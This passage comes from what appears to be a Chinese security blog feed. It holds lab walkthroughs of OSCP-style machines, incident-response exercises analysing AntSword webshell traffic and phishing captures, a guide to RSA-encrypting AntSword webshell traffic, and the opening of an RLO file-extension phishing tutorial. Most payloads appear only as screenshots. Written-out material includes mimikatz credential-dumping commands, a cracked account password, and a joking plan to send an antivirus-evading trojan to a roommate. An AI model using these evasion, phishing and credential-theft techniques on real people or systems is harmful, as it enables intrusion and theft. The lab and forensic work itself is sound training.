是一个网络监控工具，它可以帮助用户监控网络流量和分析网络行为。这个工具通常用于网络安全领域，以检测潜在的威胁和异常行为。</p></blockquote><p>后面给了版本号<code>5.3</code>，第一时间当然是查一下有无漏洞</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224441375.png" alt="image-20240628224441375"></p><p>对这几个都挺期待的，看最后一个远程代码执行漏洞</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224553130.png" alt="image-20240628224553130"></p><p>py3的，直接执行一下试试</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224644382.png" alt="image-20240628224644382"></p><p>看来是比较成功的，发现了Admin用户的key，并创建了用户名<code>h4ker</code></p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224836055.png" alt="image-20240628224836055"></p><p>这里显示监听一个端口，有点懵昂。查了一下，这个脚本的利用在第三、四行，就是这里</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628225617382.png" alt="image-20240628225617382"></p><h2 id="四、获取root权限"><a href="#四、获取root权限" class="headerlink" title="四、获取root权限"></a>四、获取root权限</h2><p>因为上面显示监听在443端口了，所以端口那里使用443</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628225900433.png" alt="image-20240628225900433"></p><p>what？</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230100328.png" alt="image-20240628230100328"></p><p>不在docker里面</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230125878.png" alt="image-20240628230125878"></p><p>what？这就完事儿了？</p><p>对其他端口展开了一些调查，发现确实获取不了其他信息了</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628230540264.png" alt="image-20240628230540264"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—PyExpvm</title>
      <link href="/2024/06/28/OSCP-PyExp/"/>
      <url>/2024/06/28/OSCP-PyExp/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—PyExpvm"><a href="#【OSCP系列】OSCP靶机—PyExpvm" class="headerlink" title="【OSCP系列】OSCP靶机—PyExpvm"></a>【OSCP系列】OSCP靶机—PyExpvm</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-PyExp/image-20240627232247823.png" alt="image-20240627232247823"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-PyExp/image-20240627232324271.png" alt="image-20240627232324271"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-PyExp/image-20240627232553908.png" alt="image-20240627232553908"></p><p><img src="/img/OSCP-PyExp/image-20240627235748090.png" alt="image-20240627235748090"></p><p>只开放了1337、3306端口</p><h3 id="3、针对开放端口做详细探测"><a href="#3、针对开放端口做详细探测" class="headerlink" title="3、针对开放端口做详细探测"></a>3、针对开放端口做详细探测</h3><p><img src="/img/OSCP-PyExp/image-20240628000021819.png" alt="image-20240628000021819"></p><p>1337是ssh服务，3306是mysql数据库服务；推测跑在Linxu服务器上</p><p>这里很奇怪，没有web服务开放，推测应该在mysql中拿信息</p><h3 id="4、针对开放端口做漏洞探测"><a href="#4、针对开放端口做漏洞探测" class="headerlink" title="4、针对开放端口做漏洞探测"></a>4、针对开放端口做漏洞探测</h3><p>虽然这样探测出来的可能性微乎其微，但必要的流程还是走一下</p><p><img src="/img/OSCP-PyExp/image-20240628000437268.png" alt="image-20240628000437268"></p><p>这里给了几个漏洞测试的脚本信息，但是他们的利用都失败了</p><h2 id="三、MySQL数据库信息收集"><a href="#三、MySQL数据库信息收集" class="headerlink" title="三、MySQL数据库信息收集"></a>三、MySQL数据库信息收集</h2><p>mysql无疑是本靶场最重要的一个突破点，先测试一下mysql是否允许外部连接</p><p><img src="/img/OSCP-PyExp/image-20240628000611734.png" alt="image-20240628000611734"></p><p>哦，这里是肯定的，那接下来我们可以尝试爆破</p><p><img src="/img/OSCP-PyExp/image-20240628001215373.png" alt="image-20240628001215373"></p><p><code>rockyou</code>这个字典属实爽快，很快就爆破出来了；接下来登陆数据库查看有无敏感信息</p><p><img src="/img/OSCP-PyExp/image-20240628001407393.png" alt="image-20240628001407393"></p><p>在<code>data</code>这个数据库中发现有个hash值</p><p><img src="/img/OSCP-PyExp/image-20240628001440897.png" alt="image-20240628001440897"></p><p>这样看着有点乱，我们分开字段值来查看</p><p><img src="/img/OSCP-PyExp/image-20240628001714076.png" alt="image-20240628001714076"></p><p>大佬勿喷，笔者还是首次碰到这个加密方法，因此查找了一些资料，下面简单对这个加密算法做出一个说明</p><blockquote><p>Fernet 算法是一个安全的加密方法，它使用 AES 作为底层加密算法，并结合 HMAC 来确保数据的完整性。</p><p>其是一种对称加密算法，由Python的cryptography库提供支持。使用Fernet加密算法可以实现简单而又强大的加密功能，通过生成加密密钥加密数据，并使用同一个密钥解密数据。</p></blockquote><p>下面对这个算法进行一个加解密的尝试，参考文章资料：<a href="https://deepinout.com/python/python-qa/84_hk_1709160332.html">Fernet加密算法在Python中的应用|极客笔记 (deepinout.com)</a></p><p>尝试对<code>Hello, world!</code>进行加解密</p><p><img src="/img/OSCP-PyExp/image-20240628003746582.png" alt="image-20240628003746582"></p><p>之后将数据库中拿到的信息进行解密，拿到了字符串：lucy:wJ9&#96;”Lemdv9[FEw-</p><p><img src="/img/OSCP-PyExp/image-20240628004435194.png" alt="image-20240628004435194"></p><p>这个字符串，明眼一看，中间由冒号<code>:</code>分割，怕是个账号密码</p><h2 id="四、SSH登陆Getshell"><a href="#四、SSH登陆Getshell" class="headerlink" title="四、SSH登陆Getshell"></a>四、SSH登陆Getshell</h2><p>也是非常的流畅，拿到了shell</p><p><img src="/img/OSCP-PyExp/image-20240628004715374.png" alt="image-20240628004715374"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>本有有用户密码的情况下，查看是否有sudo滥用的情况，果真有</p><p><img src="/img/OSCP-PyExp/image-20240628005404504.png" alt="image-20240628005404504"></p><p>这里的exec函数，将会执行任何的py代码；找一段py 的反弹shell</p><p><img src="/img/OSCP-PyExp/image-20240628010553340.png" alt="image-20240628010553340"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【流量加密】AntSword流量RSA加密</title>
      <link href="/2024/06/26/Red-Team-Invasion-AntSword-encryption/"/>
      <url>/2024/06/26/Red-Team-Invasion-AntSword-encryption/</url>
      
        <content type="html"><![CDATA[<h1 id="【流量加密】AntSword流量RSA加密"><a href="#【流量加密】AntSword流量RSA加密" class="headerlink" title="【流量加密】AntSword流量RSA加密"></a>【流量加密】AntSword流量RSA加密</h1><h2 id="一、新建编码器"><a href="#一、新建编码器" class="headerlink" title="一、新建编码器"></a>一、新建编码器</h2><p>在蚁剑的【编码管理】中，新建一个编码器，选择【PHP RSA】，名称随意</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114312428.png" alt="image-20240626114312428"></p><p>在【RSA配置】中点击【生成】将重新配置公私钥</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114435135.png" alt="image-20240626114435135"></p><p>复制最下面的PHP代码到靶机</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114515471.png" alt="image-20240626114515471"></p><h2 id="二、测试连接"><a href="#二、测试连接" class="headerlink" title="二、测试连接"></a>二、测试连接</h2><p>测试默认的编码器，连接失败</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114626428.png" alt="image-20240626114626428"></p><p>使用新建的【PHP RSA】编码器</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114852725.png" alt="image-20240626114852725"></p><h2 id="三、查看流量"><a href="#三、查看流量" class="headerlink" title="三、查看流量"></a>三、查看流量</h2><p>我们执行<code>whoami</code>，在靶机上抓取流量</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626115032037.png" alt="image-20240626115032037"></p><p>可以看到，请求包已经没有了传统的<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</code>与<code>@set_time_limit(0);</code>了</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626115307427.png" alt="image-20240626115307427"></p><p>但是响应包依然是明文，这里稍有不足</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AntSword </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第六章 流量特征分析-蚁剑流量分析</title>
      <link href="/2024/06/15/xuanji-diliuzhang-AntSword/"/>
      <url>/2024/06/15/xuanji-diliuzhang-AntSword/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第六章-流量特征分析-蚁剑流量分析"><a href="#【玄机应急】第六章-流量特征分析-蚁剑流量分析" class="headerlink" title="【玄机应急】第六章 流量特征分析-蚁剑流量分析"></a>【玄机应急】第六章 流量特征分析-蚁剑流量分析</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载附件，在Wireshark中打开</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133002004.png" alt="image-20240615133002004"></p><h2 id="二、步骤一：木马的连接密码是多少"><a href="#二、步骤一：木马的连接密码是多少" class="headerlink" title="二、步骤一：木马的连接密码是多少"></a>二、步骤一：木马的连接密码是多少</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133039067.png" alt="image-20240615133039067"></p><p>筛选HTTP流量数据，典型的蚁剑流量特征</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133248238.png" alt="image-20240615133248238"></p><p>蚁剑的连接密码也正是开头的1</p><h2 id="三、步骤二：黑客执行的第一个命令是什么"><a href="#三、步骤二：黑客执行的第一个命令是什么" class="headerlink" title="三、步骤二：黑客执行的第一个命令是什么"></a>三、步骤二：黑客执行的第一个命令是什么</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133448780.png" alt="image-20240615133448780"></p><p>看来是需要对蚁剑的流量解密了，之前提到过蚁剑的流量解密</p><p>找到第一条蚁剑的流量，进行解密，记得去掉前两位的<code>AK</code></p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133730539.png" alt="image-20240615133730539"></p><p>解密结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;/var/www/html&quot;;id;echo e124bc;pwd;echo 43523</span><br></pre></td></tr></table></figure><p>我们追踪http流，查看响应结果，执行的命令是<code>id</code>，这里感觉稍微有点那啥。。</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134031283.png" alt="image-20240615134031283"></p><h2 id="四、步骤三：黑客读取了哪个文件的内容"><a href="#四、步骤三：黑客读取了哪个文件的内容" class="headerlink" title="四、步骤三：黑客读取了哪个文件的内容"></a>四、步骤三：黑客读取了哪个文件的内容</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134131656.png" alt="image-20240615134131656"></p><p>当我们一条一条的解密，或者看响应包会发现，看的是<code>/etc/passwd</code></p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134357804.png" alt="image-20240615134357804"></p><h2 id="五、黑客上传了什么文件到服务器，提交文件名"><a href="#五、黑客上传了什么文件到服务器，提交文件名" class="headerlink" title="五、黑客上传了什么文件到服务器，提交文件名"></a>五、黑客上传了什么文件到服务器，提交文件名</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134435923.png" alt="image-20240615134435923"></p><p>在<code>437</code>号的响应包中出现了当前目录下所有的文件以及需改日期等信息</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615135015460.png" alt="image-20240615135015460"></p><p><code>flag.txt</code>文件的日期是后面修改，说明该文件很可能是黑客上传的</p><h2 id="六、黑客上传的文件内容是什么"><a href="#六、黑客上传的文件内容是什么" class="headerlink" title="六、黑客上传的文件内容是什么"></a>六、黑客上传的文件内容是什么</h2><p>还是锁定黑客上传的的<code>422</code>号请求包</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140207419.png" alt="image-20240615140207419"></p><p>那另一组类似十六进制的值大概就是上传的内容，解密下</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140243694.png" alt="image-20240615140243694"></p><h2 id="七、黑客下载了哪个文件，提交文件绝对路径"><a href="#七、黑客下载了哪个文件，提交文件绝对路径" class="headerlink" title="七、黑客下载了哪个文件，提交文件绝对路径"></a>七、黑客下载了哪个文件，提交文件绝对路径</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140324901.png" alt="image-20240615140324901"></p><p>在最后一条</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140554508.png" alt="image-20240615140554508"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蚁剑流量特征 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第七章 常见攻击事件分析--钓鱼邮件</title>
      <link href="/2024/06/14/xuanji-diqizhang-Phisshing-emails/"/>
      <url>/2024/06/14/xuanji-diqizhang-Phisshing-emails/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第七章-常见攻击事件分析–钓鱼邮件"><a href="#【玄机应急】第七章-常见攻击事件分析–钓鱼邮件" class="headerlink" title="【玄机应急】第七章 常见攻击事件分析–钓鱼邮件"></a>【玄机应急】第七章 常见攻击事件分析–钓鱼邮件</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载好流量数据包附件</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180033847.png" alt="image-20240614180033847"></p><h2 id="二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP"><a href="#二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP" class="headerlink" title="二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP"></a>二、步骤一：请分析获取黑客发送钓鱼邮件时使用的IP</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180108297.png" alt="image-20240614180108297"></p><p>先整体浏览下附件内容，有www的网站源文件和log的日志目录</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180851874.png" alt="image-20240614180851874"></p><p>这里有钓鱼的邮件，直接记事本打开。看最后一个<code>Received</code>内部的from的地址</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614183540152.png" alt="image-20240614183540152"></p><p>前面的<code>Received</code>内部的from地址大都是其他邮件服务器的代理转发地址</p><h2 id="三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP"><a href="#三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP" class="headerlink" title="三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP"></a>三、步骤二：获取黑客钓鱼邮件中使用的木马程序的控制端IP</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614183859537.png" alt="image-20240614183859537"></p><h3 id="1、过沙箱"><a href="#1、过沙箱" class="headerlink" title="1、过沙箱"></a>1、过沙箱</h3><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614202342907.png" alt="image-20240614202342907"></p><h2 id="四、步骤三：请分析获取webshell的文件名"><a href="#四、步骤三：请分析获取webshell的文件名" class="headerlink" title="四、步骤三：请分析获取webshell的文件名"></a>四、步骤三：请分析获取webshell的文件名</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614202532251.png" alt="image-20240614202532251"></p><h3 id="1、D盾扫一下"><a href="#1、D盾扫一下" class="headerlink" title="1、D盾扫一下"></a>1、D盾扫一下</h3><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614203046008.png" alt="image-20240614203046008"></p><h2 id="五、步骤四：隧道程序的文件名"><a href="#五、步骤四：隧道程序的文件名" class="headerlink" title="五、步骤四：隧道程序的文件名"></a>五、步骤四：隧道程序的文件名</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614203257208.png" alt="image-20240614203257208"></p><p>观察其他路径的文件</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614204406110.png" alt="image-20240614204406110"></p><p>疑似mysql 的配置文件<code>my.conf</code>怎么会出现在这里。过沙箱</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614204704963.png" alt="image-20240614204704963"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼邮件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第六章 流量特征分析-蚂蚁爱上树</title>
      <link href="/2024/06/13/xuanji-diliuzhang-Traffic-characteristics/"/>
      <url>/2024/06/13/xuanji-diliuzhang-Traffic-characteristics/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第六章-流量特征分析-蚂蚁爱上树"><a href="#【玄机应急】第六章-流量特征分析-蚂蚁爱上树" class="headerlink" title="【玄机应急】第六章 流量特征分析-蚂蚁爱上树"></a>【玄机应急】第六章 流量特征分析-蚂蚁爱上树</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载附件，在Wireshark中打开</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled.png" alt="Untitled"></p><h2 id="二、步骤一：管理员Admin账号的密码是什么？"><a href="#二、步骤一：管理员Admin账号的密码是什么？" class="headerlink" title="二、步骤一：管理员Admin账号的密码是什么？"></a>二、步骤一：管理员Admin账号的密码是什么？</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled1.png" alt="Untitled"></p><h3 id="1、发现蚁剑流量特征"><a href="#1、发现蚁剑流量特征" class="headerlink" title="1、发现蚁剑流量特征"></a>1、发现蚁剑流量特征</h3><p>先大致浏览一下整体的数据包，这两个端口通讯频繁</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled2.png" alt="Untitled"></p><p>找几个流量包来看一看，发现蚁剑流量特征</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled3.png" alt="Untitled"></p><h3 id="2、找管理员的密码"><a href="#2、找管理员的密码" class="headerlink" title="2、找管理员的密码"></a>2、找管理员的密码</h3><p>找木马<code>product2.php</code> ，做标记</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri contains <span class="string">&quot;/product2.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl a 全选，然后ctrl m 做标记</span></span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled4.png" alt="Untitled"></p><p>之后重新回归http，看木马的响应包</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled5.png" alt="Untitled"></p><p>追踪http流，是数据库的配置文件，搜索一下</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled6.png" alt="Untitled"></p><p>找个md5解密下</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled7.png" alt="Untitled"></p><p>flag不对，并不是真的密码</p><h3 id="3、真实的Admin密码"><a href="#3、真实的Admin密码" class="headerlink" title="3、真实的Admin密码"></a>3、真实的Admin密码</h3><p>继续查看蚁剑的响应包。在3414这个包中可以看到此时并没有Admin用户。因此推测Admin是黑客权限维持的一个用户</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled8.png" alt="Untitled"></p><p>那这有点麻烦了，如果Admin是黑客新增用户做的权限维持的话，是没有返回结果的，我们需要破解蚁剑的流量。蚁剑的流量特征还是很好鉴别的，如果不懂，还请移步到<strong>【蓝队应急】WebShell 流量特征</strong> 文章查看。</p><p>我们找没有回显或回显较少的包，对请求的蚁剑流量做解析。为了让大家动手破解，这里也不写脚本工具，仅用一些在线网站即可。</p><p>好在这个加密并不是很难，仅仅URL和base64。我们需要对蚁剑的流量掐头去尾：</p><ol><li>先URL解码一下</li><li>再以&amp;为分隔符，去掉所有的&amp;，仅仅留下来中间最大的base64编码</li><li>再进行base64解码下</li></ol><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled9.png" alt="Untitled"></p><p>再base64解码即可，这里的示例是3531号数据包，大家可以一同尝试解密下</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled10.png" alt="Untitled"></p><p>当然，更简单的方法是直接筛选蚁剑的流量包，在下面一栏看请求的数据</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled11.png" alt="Untitled"></p><p>一步步解密，最后在15190号包中找到，记得解密时把<code>il</code> 去掉</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled12.png" alt="Untitled"></p><p>找到黑客权限维持时创建的Admin 的密码是<code>Password1</code></p><h2 id="三、步骤二：LSASS-exe的程序进程ID是多少？"><a href="#三、步骤二：LSASS-exe的程序进程ID是多少？" class="headerlink" title="三、步骤二：LSASS.exe的程序进程ID是多少？"></a>三、步骤二：LSASS.exe的程序进程ID是多少？</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled13.png" alt="Untitled"></p><p>同样的，这个也需要一步步解密蚁剑的流量，在<code>5922</code>号数据包</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled14.png" alt="Untitled"></p><h2 id="四、步骤三：用户WIN101的密码是什么"><a href="#四、步骤三：用户WIN101的密码是什么" class="headerlink" title="四、步骤三：用户WIN101的密码是什么?"></a>四、步骤三：用户WIN101的密码是什么?</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled15.png" alt="Untitled"></p><h3 id="1、导出密码文件"><a href="#1、导出密码文件" class="headerlink" title="1、导出密码文件"></a>1、导出密码文件</h3><p>在步骤二中，黑客dump下来lsass进程到<code>C:\temp\OnlineShopBackup.zip</code> ，那我们需要拿到这个文件</p><p>在<code>6944</code>号数据包中，解密后是查看<code>C:\temp\OnlineShopBackup.zip</code> 的内容，那么它的相应包就是咱们需要的文件了。直接在【文件】中【到处对象】选择http，找到这个号数据包下方的47MB的数据保存</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled16.png" alt="Untitled"></p><p>导出了一个product2.php 文件，但这个数据包中还有蚁剑的数据</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled17.png" alt="Untitled"></p><p>删除开头的<code>e1c1709</code> ，修改后缀成dmp</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled18.png" alt="Untitled"></p><h3 id="2、加载密码文件"><a href="#2、加载密码文件" class="headerlink" title="2、加载密码文件"></a>2、加载密码文件</h3><p>交给mimikatz 去加载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::<span class="variable constant_">minidump</span> <span class="number">1</span>.dmp</span><br><span class="line">sekurlsa::<span class="variable constant_">logonpasswords</span></span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled19.png" alt="Untitled"></p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled20.png" alt="Untitled"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量特征 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第六章特征分析—waf上截获的黑客攻击流量</title>
      <link href="/2024/06/13/xuanji-diliuzhang-waf/"/>
      <url>/2024/06/13/xuanji-diliuzhang-waf/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第六章特征分析—waf上截获的黑客攻击流量"><a href="#【玄机应急】第六章特征分析—waf上截获的黑客攻击流量" class="headerlink" title="【玄机应急】第六章特征分析—waf上截获的黑客攻击流量"></a>【玄机应急】第六章特征分析—waf上截获的黑客攻击流量</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载好流量数据包<code>.pcap</code>，在<code>WireShark</code>中打开</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613132832287.png" alt="image-20240613132832287"></p><h2 id="二、步骤一：黑客登陆系统的密码"><a href="#二、步骤一：黑客登陆系统的密码" class="headerlink" title="二、步骤一：黑客登陆系统的密码"></a>二、步骤一：黑客登陆系统的密码</h2><p><img src="/img/xuanji-diliuzhang-waf/image-20240613132906529.png" alt="image-20240613132906529"></p><h3 id="1、筛选POST请求"><a href="#1、筛选POST请求" class="headerlink" title="1、筛选POST请求"></a>1、筛选POST请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>登陆的地址在<code>/admin/login.php?rec=login</code></p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133123336.png" alt="image-20240613133123336"></p><h3 id="2、筛选全部的登陆请求"><a href="#2、筛选全部的登陆请求" class="headerlink" title="2、筛选全部的登陆请求"></a>2、筛选全部的登陆请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot; &amp;&amp; http.request.uri contains &quot;rec=login&quot;</span><br></pre></td></tr></table></figure><p>直接找最后几条</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133320489.png" alt="image-20240613133320489"></p><h2 id="三、步骤二：黑客发现的关键字符串"><a href="#三、步骤二：黑客发现的关键字符串" class="headerlink" title="三、步骤二：黑客发现的关键字符串"></a>三、步骤二：黑客发现的关键字符串</h2><p>题目中xxx的数量有32个，那么字符串也既有可能就是32位</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133436956.png" alt="image-20240613133436956"></p><h3 id="1、蚁剑流量特征"><a href="#1、蚁剑流量特征" class="headerlink" title="1、蚁剑流量特征"></a>1、蚁剑流量特征</h3><p>查看http流量的时候，发现很多对<code>a.php</code>文件发起访问</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133836165.png" alt="image-20240613133836165"></p><p>仔细查看流量发现是蚁剑的流量特征</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133746151.png" alt="image-20240613133746151"></p><h3 id="2、筛选蚁剑的响应数据包"><a href="#2、筛选蚁剑的响应数据包" class="headerlink" title="2、筛选蚁剑的响应数据包"></a>2、筛选蚁剑的响应数据包</h3><p>我们筛选所有蚁剑的请求包，之后做上标记</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri contains &quot;/a.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-waf/image-20240613145606097.png" alt="image-20240613145606097"></p><p>回到http中，看蚁剑的响应包</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150202712.png" alt="image-20240613150202712"></p><h2 id="四、步骤三：黑客找到的数据库密码"><a href="#四、步骤三：黑客找到的数据库密码" class="headerlink" title="四、步骤三：黑客找到的数据库密码"></a>四、步骤三：黑客找到的数据库密码</h2><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150423924.png" alt="image-20240613150423924"></p><p>同样是在蚁剑的响应包中找到</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150411200.png" alt="image-20240613150411200"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【红队入侵】文件钓鱼—RLO构造后缀</title>
      <link href="/2024/06/07/Red-Team-Invasion-RLO-file-fishing/"/>
      <url>/2024/06/07/Red-Team-Invasion-RLO-file-fishing/</url>
      
        <content type="html"><![CDATA[<h1 id="【红队入侵】文件钓鱼—RLO构造后缀"><a href="#【红队入侵】文件钓鱼—RLO构造后缀" class="headerlink" title="【红队入侵】文件钓鱼—RLO构造后缀"></a>【红队入侵】文件钓鱼—RLO构造后缀</h1><h2 id="一、前景需求"><a href="#一、前景需求" class="headerlink" title="一、前景需求"></a>一、前景需求</h2><p>当我们想发送一个木马给身边凌晨两点还在计划打团的室友，帮助他戒网瘾，早睡早起养好身体。我们需要做的准备：</p><ol><li>公网服务器</li><li>免杀的exe木马</li><li>监听的服务端</li><li>Resource Hacker</li><li>winrar 压缩包程序</li></ol><p>如下所示：<img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606205723891.png" alt="image-20240606205723891"></p><p>但是单单的exe 难免让人起疑心，搞不好会挨室友的大拳头。</p><h2 id="二、木马图标修改"><a href="#二、木马图标修改" class="headerlink" title="二、木马图标修改"></a>二、木马图标修改</h2><p>这里用<code>Resource Hacker</code>工具，给exe木马上上图标。当然，也有其他相关工具可以使用，这里只是一个示例</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210010305.png" alt="image-20240606210010305"></p><p>另外从网上找来一个类似word 的ico 图标，当然了，这个图标并不是真的，各位可以动手自己制作一个。</p><p><img 